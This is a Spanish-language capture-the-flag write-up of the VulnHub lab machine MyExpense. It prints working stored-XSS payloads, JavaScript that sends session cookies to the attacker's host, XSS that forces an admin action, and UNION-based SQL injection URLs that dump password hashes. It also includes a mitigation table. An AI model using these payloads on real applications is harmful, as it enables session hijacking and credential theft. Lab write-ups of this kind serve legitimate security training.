# Writeup: MyExpense — XSS, Robo de Sesión y Escalación de Privilegios

**Plataforma:** VulnHub  
**Máquina:** MyExpense  
**Dificultad:** Easy/Medium  
**OS:** Linux  
**IP Objetivo:** 192.168.1.33  
**IP Atacante:** 192.168.1.22  
**Autor:** Gustavo Morales Barrantes

---

## 🎯 Objetivo

Comprometer la aplicación web MyExpense explotando múltiples vulnerabilidades: bypass de restricciones client-side, Stored XSS para robo de cookies de múltiples usuarios, escalación horizontal de privilegios y SQL Injection para obtener credenciales y acceso completo al sistema.

---

## 🔎 1. Enumeración Inicial

### Fase 1 — Descubrimiento de puertos

```bash
nmap -sS -p- -n -Pn --open --min-rate 3500 192.168.1.33 -oG Ports
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-31 23:37 CST
Nmap scan report for 192.168.1.33
Host is up (0.00051s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
41549/tcp open  unknown
54691/tcp open  unknown
57693/tcp open  unknown
58199/tcp open  unknown
MAC Address: 00:0C:29:43:0B:54 (VMware)
```

### Fase 2 — Detección de servicios y versiones

```bash
nmap -sCV -p80,41549,54691,57693,58199 -n -Pn 192.168.1.33
```

| Puerto | Servicio | Versión |
|---|---|---|
| 80/tcp | HTTP | Apache httpd 2.4.25 (Debian) |
| 41549/tcp | HTTP | Mongoose httpd |
| 54691/tcp | HTTP | Mongoose httpd |
| 57693/tcp | HTTP | Mongoose httpd |
| 58199/tcp | HTTP | Mongoose httpd |

**Hallazgos clave:**
- `http-robots.txt` expone `/admin/admin.php` — panel de administración indexado
- `PHPSESSID` sin flag `HttpOnly` — cookies accesibles vía JavaScript
- Puertos Mongoose — servicios internos de la aplicación

> ⚠️ El flag `httponly not set` detectado por Nmap confirma desde el inicio que el ataque **XSS → robo de cookie → session hijacking** será viable.

---

## 🌐 2. Enumeración de la Aplicación Web

### Identificación de tecnología

```bash
whatweb http://192.168.1.33
```

```
http://192.168.1.33 [200 OK] Apache[2.4.25], Bootstrap, Cookies[PHPSESSID],
Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)],
IP[192.168.1.33], Title[Futura Business Informatique GROUPE - Conseil en ingénierie]
```

**Hallazgos:**
- Servidor: **Apache 2.4.25** sobre **Debian Linux**
- Framework frontend: **Bootstrap**
- Gestión de sesiones: **PHPSESSID**
- Aplicación: sistema web corporativo de gestión de gastos

### Enumeración de directorios — raíz

```bash
gobuster dir -u http://192.168.1.33/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20
```

```
/img        (Status: 301) → http://192.168.1.33/img/
/admin      (Status: 301) → http://192.168.1.33/admin/
/css        (Status: 301) → http://192.168.1.33/css/
/includes   (Status: 301) → http://192.168.1.33/includes/
/config     (Status: 301) → http://192.168.1.33/config/
/fonts      (Status: 301) → http://192.168.1.33/fonts/
```

Acceder a `/admin/` directamente devuelve **Error 403 - Forbidden**. Al inspeccionar el código fuente (`Ctrl+U`) se confirma que la aplicación está construida en **PHP** y expone rutas como `/signup.php` y `/login.php`.

### Enumeración de directorios — /admin/ con extensión PHP

```bash
gobuster dir -u http://192.168.1.33/admin/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 -x php
```

```
/admin.php   (Status: 200) [Size: 13853]
```

> La carpeta `/admin/` devuelve 403, pero `/admin/admin.php` es accesible con **200 OK** — el servidor restringe el directorio pero no el archivo específico.

### Acceso al panel de administración

`robots.txt` reveló la ruta:
```
Disallow: /admin/admin.php
```

Navegando a `http://192.168.1.33/admin/admin.php` se accede al panel **sin autenticación**. El panel expone la lista completa de usuarios del sistema, entre ellos: **slamotte**

![[acceso a la pagina admin_admin_php.png]]


---

## 🔓 3. Bypass de Restricción Client-Side — Creación de Usuario

### Hallazgo en /signup.php

El formulario de registro en `http://192.168.1.33/signup.php` tiene el botón **Sign Up deshabilitado** con el atributo HTML `disabled=""` — restricción puramente **client-side**.

### Bypass

Usando DevTools (`Ctrl + Shift + C`):

1. Inspeccionar el botón Sign Up
2. Localizar el atributo `disabled=""`
3. Eliminarlo desde el inspector

```html
<!-- Antes -->
<button type="submit" disabled="">Sign Up</button>

<!-- Después -->
<button type="submit">Sign Up</button>
```

### Resultado

Usuario creado. Al verificar en `/admin/admin.php` aparece con **estado: inactivo**.
![[activacion de usuario slamotte.png]]

> La aplicación **no valida el registro en el servidor** — la restricción era decorativa.

---

## 🔍 4. Identificación y Confirmación del Stored XSS

Se repite el bypass del botón y se crea un usuario inyectando el payload en **Firstname** y **Lastname**:

```html
<script>alert("XSS")</script>
```

| Campo     | Payload                         | Resultado    |
| --------- | ------------------------------- | ------------ |
| Firstname | `<script>alert("XSS")</script>` | ✅ Vulnerable |
| Lastname  | `<script>alert("XSS")</script>` | ✅ Vulnerable |

Al cargar `http://192.168.1.33/admin/admin.php` aparecen **dos ventanas de alerta consecutivas** — una por cada campo.

![[Comprobacion xss exitosa.png]]

**Tipo:** Stored XSS — el payload queda en base de datos y se ejecuta automáticamente cada vez que el panel renderiza la lista de usuarios.

---

## 🍪 5. Robo de Cookie del Administrador

### Verificación de conectividad

Antes de crear el script se verifica que la víctima alcanza nuestra máquina:

```html
<script src="http://192.168.1.22/script.js"></script>
```

```
192.168.1.33 - - "GET /script.js HTTP/1.1" 404
```

> El **404 confirma que el XSS se ejecutó** — la conexión llegó aunque el archivo no existía.

### script.js — exfiltración de cookie

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.22/?cookie=' + document.cookie);
request.send();
```

```bash
python3 -m http.server 80
```

**Resultado:**
```
192.168.1.33 - - "GET /script.js HTTP/1.1" 200 -
192.168.1.33 - - "GET /?cookie=PHPSESSID=paq5fft400kmomie68c0cbr0m6 HTTP/1.1" 200 -
```

**Cookie del administrador obtenida:** `PHPSESSID=paq5fft400kmomie68c0cbr0m6`


![[ingreso de cookie.png]]


---

## 🚫 6. Intento de Session Hijacking — Limitación Encontrada

Con la cookie obtenida se intenta acceder al panel reemplazándola en DevTools (**Application → Storage → Cookies**).

**Error:**
```
Sorry, as an administrator, you can be authenticated only once a time.
```

> La aplicación implementa **restricción de sesión concurrente** — detecta que el admin ya tiene sesión activa y bloquea el acceso.


---

## ⚡ 7. Activación de Usuario vía XSS — Acceso como slamotte

Se cambia de técnica: en lugar de robar la cookie, se hace que el navegador del admin **ejecute una acción autenticada** en nuestro nombre.

### Objetivo

Activar el usuario `slamotte` (ID=11) cuyas credenciales conocemos pero está **inactivo**.

### script.js actualizado

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.33/admin/admin.php?id=11&status=active');
request.send();
```

Se registra nuevo usuario con payload en Firstname/Lastname, se levanta el servidor y se espera que el admin cargue el panel.

**¿Qué ocurre técnicamente?**
1. El admin carga `/admin/admin.php`
2. Su navegador ejecuta `script.js` desde `192.168.1.22`
3. Se realiza `GET /admin/admin.php?id=11&status=active` con **su sesión autenticada**
4. El servidor activa al usuario slamotte

**Resultado:** `slamotte` activado → login exitoso.

![[activacion de usuario slamotte.png]]


---

## 📋 8. Reconocimiento como slamotte — Identificación de la Cadena de Aprobación

Con sesión activa como `slamotte` se explora la aplicación:

- **`/expense_reports.php`** — se envía la factura pendiente de slamotte
- **`/profile.php`** — se identifica que el supervisor de slamotte es **Manon Rivière**

> La aplicación tiene una cadena de aprobación: el empleado envía la factura → el supervisor la aprueba → finanzas la valida.

Para que la factura sea aprobada necesitamos comprometer la cuenta de **Manon Rivière**.

---

## 🍪 9. Robo de Cookie de Manon Rivière — XSS en Mensajes

Se identifica un campo vulnerable en `http://192.168.1.33/index.php` — campo **"Your message"**.

### test.js — exfiltración de cookie

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.22:4646/?cookie=' + document.cookie);
request.send();
```

### Payload inyectado en el campo message

```html
<script src=http://192.168.1.22/test.js></script>
```

```bash
python3 -m http.server 4646
```

### Resultado — múltiples cookies capturadas

```
192.168.1.33 - - "GET /test.js HTTP/1.1" 200 -
192.168.1.33 - - "GET /?cookie=PHPSESSID=9tmoaf1fhmmlvt5pc9u62hiah7 HTTP/1.1" 200 -
192.168.1.33 - - "GET /?cookie=PHPSESSID=vkbh50prqfsaoulh571kr47dg4 HTTP/1.1" 200 -
192.168.1.33 - - "GET /?cookie=PHPSESSID=lbsio1gjtlmeggr3mcedfbia87 HTTP/1.1" 200 -
192.168.1.33 - - "GET /?cookie=PHPSESSID=paq5fft400kmomie68c0cbr0m6 HTTP/1.1" 200 -
```

Se capturan **4 cookies distintas** — múltiples usuarios visitaron la página con el payload activo.

Verificando en `/profile.php` con cada cookie se identifica:

| Cookie | Usuario |
|---|---|
| `paq5fft400kmomie68c0cbr0m6` | Administrador (conocida) |
| `vkbh50prqfsaoulh571kr47dg4` | **Manon Rivière** (supervisora de slamotte) |



---

## 🔍 10. Session Hijacking como Manon Rivière

Se reemplaza la cookie en DevTools con `vkbh50prqfsaoulh571kr47dg4`.

Acceso exitoso como **Manon Rivière**. Se verifica en `/profile.php` que su supervisor es **Paul Baudouin** (finanzas).

Se aprueba la factura de `slamotte` desde `/expense_reports.php`.

![[aprobacion de factura desde manon riviere.png]]


---

## 💉 11. SQL Injection en site.php

Al explorar la aplicación como Manon Rivière se descubre una nueva página: `http://192.168.1.33/site.php?id=2`

### Detección — ORDER BY

```
http://192.168.1.33/site.php?id=2 order by 2-- -
```

Sin error → la query retorna **2 columnas**.

### Confirmación — UNION SELECT

```
http://192.168.1.33/site.php?id=2 union select 1,user()-- -
```

### Enumeración de bases de datos

```
http://192.168.1.33/site.php?id=2 union select 1,schema_name from information_schema.schemata-- -
```

### Enumeración de tablas

```
http://192.168.1.33/site.php?id=2 union select 1,table_name from information_schema.tables where table_schema='myexpense'-- -
```

### Enumeración de columnas — tabla user

```
http://192.168.1.33/site.php?id=2 union select 1,column_name from information_schema.columns where table_schema='myexpense' and table_name='user'-- -
```

### Extracción de credenciales

```
http://192.168.1.33/site.php?id=2 union select 1,group_concat(username,0x3a,password) from user-- -
```

**Resultado:**

```
afoulon:124922b5d61dd31177ec83719ef8110a
pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a
rlefrancois:ef0dafa5f531b54bf1f09592df1cd110
mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc
mnguyen:f7111a83d50584e3f91d85c3db710708
pgervais:2ba907839d9b2d94be46aa27cec150e5
placombe:04d1634c2bfffa62386da699bb79f191
triou:6c26031f0e0859a5716a27d2902585c7
broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27
brenaud:2204079caddd265cedb20d661e35ddc9
slamotte:21989af1d818ad73741dfdbef642b28f
nthomas:a085d095e552db5d0ea9c455b4e99a30
vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3
rmasson:ebfc0985501fee33b9ff2f2734011882
manuel:ffea3ca358b423b140af2443da14e22b
```

![[hash de pbaudouin.png]]


### Crackeo de hashes

Los hashes son **MD5**. Se usa [hashes.com](https://hashes.com/en/decrypt/hash) para descifrarlos.

| Usuario | Hash MD5 | Contraseña |
|---|---|---|
| pbaudouin | `64202ddd5fdea4cc5c2f856efef36e1a` | **HackMe** |

---

## ✅ 12. Aprobación Final — Acceso como Paul Baudouin

Se hace login con `pbaudouin:HackMe`.

Paul Baudouin es el supervisor de finanzas — tiene permisos para aprobar facturas definitivamente.

Se aprueba la factura de `slamotte` desde `/expense_reports.php`.

![[inicio de seccion con pbau.png]]


---

## 🏁 13. Flag

Se vuelve a iniciar sesión con `slamotte`. La factura aprobada revela la flag.

![[flag.png]]


---

## 🧠 14. Vulnerabilidades Explotadas

### 1. Bypass de restricción client-side
- Botón `disabled=""` sin validación server-side
- Cualquier usuario puede registrarse eliminando el atributo

### 2. Stored XSS en campos Firstname y Lastname
- Input no sanitizado almacenado en base de datos
- Ejecutado automáticamente en el panel admin

### 3. Cookie de sesión sin flag HttpOnly
- `PHPSESSID` accesible vía `document.cookie`
- Permitió robo de múltiples sesiones

### 4. Ausencia de tokens CSRF
- Panel admin procesa acciones GET sin verificación de origen
- Permitió activar usuarios vía XSS

### 5. Stored XSS en campo de mensajes
- Campo "Your message" sin sanitización
- Permitió robar cookies de múltiples usuarios simultáneamente

### 6. SQL Injection en site.php
- Parámetro `id` no parametrizado
- Permitió extraer toda la base de datos de usuarios y contraseñas

### 7. Contraseñas débiles almacenadas como MD5
- Hash MD5 sin salt — crackeable en segundos
- `pbaudouin:HackMe` descifrado en hashes.com

---

## 🛡️ 15. Recomendaciones

| Vulnerabilidad | Mitigación |
|---|---|
| Bypass client-side | Validar el registro en el servidor |
| Stored XSS | Sanitizar input, implementar CSP, codificar output |
| Cookie sin HttpOnly | Flag `HttpOnly` en todas las cookies de sesión |
| Ausencia de CSRF | Tokens CSRF en todas las acciones sensibles |
| SQL Injection | Usar consultas parametrizadas / prepared statements |
| Hashes MD5 | Usar bcrypt o Argon2 con salt único por usuario |
| Panel admin sin auth | Requerir autenticación para `/admin/admin.php` |

---

## 🚀 16. Herramientas Utilizadas

- `Nmap` — Escaneo de red y detección de servicios
- `WhatWeb` — Fingerprinting de tecnología web
- `Gobuster` — Enumeración de directorios
- `Python http.server` — Servidor HTTP para exfiltración de cookies
- `DevTools (Browser)` — Bypass client-side y session hijacking
- `hashes.com` — Crackeo de hashes MD5

---

## 🔗 Cadena de Ataque Completa

```
Nmap → puertos + httponly not set detectado
→ WhatWeb + Gobuster → /admin/admin.php sin auth + lista de usuarios
→ /signup.php → bypass disabled="" → usuario creado (inactivo)
→ Stored XSS en Firstname/Lastname → alert confirmado
→ XSS + script.js → cookie admin robada (PHPSESSID=paq5ff...)
→ Session hijacking bloqueado → sesión concurrente
→ XSS + script.js modificado → slamotte (id=11) activado como admin
→ Login como slamotte → factura enviada → supervisor: Manon Rivière
→ XSS en campo "Your message" → 4 cookies capturadas
→ Cookie vkbh50... identificada como Manon Rivière
→ Session hijacking como mriviere → factura de slamotte aprobada
→ SQLi en site.php?id=2 → dump completo de usuarios y hashes MD5
→ Hash pbaudouin crackeado → HackMe
→ Login como pbaudouin → aprobación final de factura
→ Login como slamotte → FLAG
```

---

> ⚠️ *Este writeup fue realizado en un entorno de laboratorio controlado sobre una máquina de VulnHub con fines educativos únicamente.*
